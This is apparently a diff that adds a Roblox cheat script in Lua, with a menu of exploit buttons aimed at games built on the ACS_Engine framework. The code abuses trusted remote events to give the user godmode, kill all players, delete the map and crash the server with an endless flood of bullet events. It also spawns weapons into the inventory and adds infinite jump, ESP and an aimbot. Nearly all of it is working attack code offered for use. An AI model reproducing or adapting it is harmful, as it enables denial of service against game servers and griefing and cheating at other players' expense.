+game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Damage:FireServer(game.Players.LocalPlayer.Character.Humanoid, -math.huge, 0, 0)
+end)
+
+Section3:NewButton("Server Crasher [ ATN ]", " [ Amsterdam The Netherlands ]", function()
+while task.wait() do
+
+   for i = 1, 30000000 do
+       game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.ServerBullet:FireServer(Vector3.new(100000/100000/100000),Vector3.new(100000/100000/100000))
+   end
+end
+end)
+
+Section3:NewButton("GodMode [ Alpha Placks ]", " [ Alpha Placks ]", function()
+game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Damage:FireServer(game.Players.LocalPlayer.Character.Humanoid, -math.huge, 0, 0)
+end)
+
+Section3:NewButton("Kill All [ Alpha Plancks ]", "[ Alpha Plancks ]", function()
+    local ReplicatedStorage = game:GetService('ReplicatedStorage')
+local DamageEvent = ReplicatedStorage['ACS_Engine'].Eventos.Damage
+
+local Players = game:GetService('Players')
+
+local function dealInfiniteDamageToAllPlayers()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Character and player.Character:FindFirstChild('Humanoid') then
+            DamageEvent:FireServer(player.Character.Humanoid, math.huge, 0, 0)
+        end
+    end
+end
+
+
+dealInfiniteDamageToAllPlayers()
+end)
+
+Section3:NewButton("Map Verwijderen [ Alpha Plancks ]", " [ Alpha Plancks ]", function()
+    local cFrame = CFrame.new(0,0,0)
+
+
+local Size = {
+  X = 1000000000000000,
+  Y = 1000000000000000,
+  Z = 1000000000000000
+}
+
+game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Breach:FireServer(3,{Fortified={},Destroyable=workspace},CFrame.new(),CFrame.new(),{CFrame=game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame*cFrame,Size=Size})
+end)
+
+
+
+
+Section3:NewButton("Kill All [ DRACHTEN ]", "[ DRACHTEN ]", function()
+    local ReplicatedStorage = game:GetService('ReplicatedStorage')
+local DamageEvent = ReplicatedStorage['ACS_Engine'].Eventos.Damage
+
+local Players = game:GetService('Players')
+
+local function dealInfiniteDamageToAllPlayers()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Character and player.Character:FindFirstChild('Humanoid') then
+            DamageEvent:FireServer(player.Character.Humanoid, math.huge, 0, 0)
+        end
+    end
+end
+
+
+dealInfiniteDamageToAllPlayers()
+end)
+
+Section2:NewButton("WAPENS [ SOMS WERKEND ]", "wapens", function()
+    local args = { [1] = "Change", [2] = "Veiligheids touw", [3] = "Inv" } game:GetService("ReplicatedStorage").Inventory:FireServer(unpack(args))
+    local args = { [1] = "Change", [2] = "DSI SIG MCX", [3] = "Inv" } game:GetService("ReplicatedStorage").Inventory:FireServer(unpack(args))
+        local args = { [1] = "Change", [2] = "Shield", [3] = "Inv" } game:GetService("ReplicatedStorage").Inventory:FireServer(unpack(args))
+            local args = { [1] = "Change", [2] = "roodgl", [3] = "Inv" } game:GetService("ReplicatedStorage").Inventory:FireServer(unpack(args))
+                        local args = { [1] = "Change", [2] = "roze akm", [3] = "Inv" } game:GetService("ReplicatedStorage").Inventory:FireServer(unpack(args))
+                        local args = { [1] = "Change", [2] = "AKM", [3] = "Inv" } game:GetService("ReplicatedStorage").Inventory:FireServer(unpack(args))
+                        local args = { [1] = "Change", [2] = "HK G28", [3] = "Inv" } game:GetService("ReplicatedStorage").Inventory:FireServer(unpack(args))
+                        local args = { [1] = "Change", [2] = "M9", [3] = "Inv" } game:GetService("ReplicatedStorage").Inventory:FireServer(unpack(args))
+                        local args = { [1] = "Change", [2] = "GOLDDesert", [3] = "Inv" } game:GetService("ReplicatedStorage").Inventory:FireServer(unpack(args))
+                        local args = { [1] = "Change", [2] = "GOLDRem", [3] = "Inv" } game:GetService("ReplicatedStorage").Inventory:FireServer(unpack(args))
+                        local args = { [1] = "Change", [2] = "TS Glock 17", [3] = "Inv" } game:GetService("ReplicatedStorage").Inventory:FireServer(unpack(args))
+                        local args = { [1] = "Change", [2] = "SIG MCX VIRTUS", [3] = "Inv" } game:GetService("ReplicatedStorage").Inventory:FireServer(unpack(args))
+                        local args = { [1] = "Change", [2] = "M93R", [3] = "Inv" } game:GetService("ReplicatedStorage").Inventory:FireServer(unpack(args))
+                        local args = { [1] = "Change", [2] = "AK-47", [3] = "Inv" } game:GetService("ReplicatedStorage").Inventory:FireServer(unpack(args))
+                    
+end)
+
+Section2:NewButton("Rejoin game", "rejoin", function()
+    game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
+end)
+
+Section2:NewTextBox("Wapen naam:", "TextboxInfo", function(txt)
+    local args = { [1] = "Change", [2] = txt, [3] = "Inv" } game:GetService("ReplicatedStorage").Inventory:FireServer(unpack(args))
+
+end)
+
+Section2:NewButton("Inf Jump", "[ FIXED ]", function()
+
+
+_G.infinjump = true
+ 
+local Player = game:GetService("Players").LocalPlayer
+local Mouse = Player:GetMouse()
+Mouse.KeyDown:connect(function(k)
+if _G.infinjump then
+if k:byte() == 32 then
+Humanoid = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+Humanoid:ChangeState("Jumping")
+wait(0.1)
+Humanoid:ChangeState("Seated")
+end
+end
+end)
+ 
+local Player = game:GetService("Players").LocalPlayer
+local Mouse = Player:GetMouse()
+Mouse.KeyDown:connect(function(k)
+k = k:lower()
+if k == "r" then
+if _G.infinjump == true then
+_G.infinjump = false
+else
+_G.infinjump = true
+end
+end
+end)
+end)
+
+Section2:NewToggle("ESP/HIGLIHT Toggle", "ToggleInfo", function(state)
+    if state then
+		ActivateESP()
+
+    else
+		DeactivateESP()
+    end
+end)
+
+
+
+-- Aimbot Lib
+local Camera = workspace.CurrentCamera
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local LocalPlayer = Players.LocalPlayer
+local Holding = false
+
+_G.AimbotEnabled = false
+_G.TeamCheck = false
+_G.AimPart = "Head"
+_G.Sensitivity = 0 
+
+local function GetClosestPlayer()
+	local MaximumDistance = math.huge
+	local Target = nil
+  
+  	coroutine.wrap(function()
+    		wait(20); MaximumDistance = math.huge 
+  	end)()
+
+	for _, v in next, Players:GetPlayers() do
+		if v.Name ~= LocalPlayer.Name then
+			if _G.TeamCheck == true then
+				if v.Team ~= LocalPlayer.Team then
+					if v.Character ~= nil then
+						if v.Character:FindFirstChild("HumanoidRootPart") ~= nil then
+							if v.Character:FindFirstChild("Humanoid") ~= nil and v.Character:FindFirstChild("Humanoid").Health ~= 0 then
+								local ScreenPoint = Camera:WorldToScreenPoint(v.Character:WaitForChild("HumanoidRootPart", math.huge).Position)
+								local VectorDistance = (Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y) - Vector2.new(ScreenPoint.X, ScreenPoint.Y)).Magnitude
+								
+								if VectorDistance < MaximumDistance then
+									Target = v
+                  							MaximumDistance = VectorDistance
+								end
+							end
+						end
+					end
+				end
+			else
+				if v.Character ~= nil then
+					if v.Character:FindFirstChild("HumanoidRootPart") ~= nil then
+						if v.Character:FindFirstChild("Humanoid") ~= nil and v.Character:FindFirstChild("Humanoid").Health ~= 0 then
+							local ScreenPoint = Camera:WorldToScreenPoint(v.Character:WaitForChild("HumanoidRootPart", math.huge).Position)
+							local VectorDistance = (Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y) - Vector2.new(ScreenPoint.X, ScreenPoint.Y)).Magnitude
+							
+							if VectorDistance < MaximumDistance then
+								Target = v
+               							MaximumDistance = VectorDistance
+							end
+						end
+					end
+				end
+			end
+		end
+	end
+
+	return Target
+end
+
+UserInputService.InputBegan:Connect(function(Input)
+    if Input.UserInputType == Enum.UserInputType.MouseButton2 then
+        Holding = true
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(Input)
+    if Input.UserInputType == Enum.UserInputType.MouseButton2 then
+        Holding = false
+    end
+end)
+
+RunService.RenderStepped:Connect(function()
+    if Holding == true and _G.AimbotEnabled == true then
+        TweenService:Create(Camera, TweenInfo.new(_G.Sensitivity, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = CFrame.new(Camera.CFrame.Position, GetClosestPlayer().Character[_G.AimPart].Position)}):Play()
+    end
+end)
+
+
+Section2:NewToggle("Aimbot Toggle", "ToggleInfo", function(state)
+    if state then
+		_G.AimbotEnabled = true
+
+    else
+		_G.AimbotEnabled = false
+    end
+end)
+
+local Tab = Window:NewTab("CREDITS")
+local Section = Tab:NewSection("CREDITS: MEX ,BAMBOE |")
+
+Section:NewButton("CREDITS: MEX ,BAMBOE", "in console", function()
+    print("CREDITS: MEX ,BAMBOE")
+end)
